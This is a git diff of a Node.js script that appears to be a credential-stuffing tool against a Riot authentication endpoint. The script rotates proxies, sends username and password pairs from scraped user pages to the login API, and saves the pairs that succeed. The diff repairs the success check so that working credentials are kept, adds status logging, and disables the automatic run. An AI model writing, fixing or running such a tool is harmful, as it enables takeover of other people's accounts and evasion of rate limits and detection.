@@ -21,9 +21,9 @@ const minPageNum = 13;
 const states = urls.map((url, i) => ({ url, pageNum: minPageNum + i, lastUsers: [] }));
 let lastProxy = null;
 
-const authorize = proxy =>
+const authorize = async proxy => {
   // const { host, port } = proxy;
-  axios({
+  const response = await axios({
     options: {
       method: 'post',
       url: RIOT_AUTH_URL,
@@ -41,6 +41,8 @@ const authorize = proxy =>
     },
     persist: true
   });
+  console.log('POST got', response.status);
+};
 const changeProxy = async () => {
   const proxy = getProxy();
   const { host, port } = getProxyInfo(proxy);
@@ -65,7 +67,8 @@ const testCredentials = async (url, username, password, proxyConfig) => {
     }
   };
   const response = await axios({ options, persist: true });
-  if (!response || (response.status < 200 && response.status >= 300)) return;
+  console.log('PUT got', response.status);
+  if (!response || response.status < 200 || response.status >= 300) return;
   account.save({
     UserName: username,
     Password: password,
@@ -113,5 +116,5 @@ const execute = () =>
     execute();
   }, interval);
 
-if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
+// if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
 // execute();
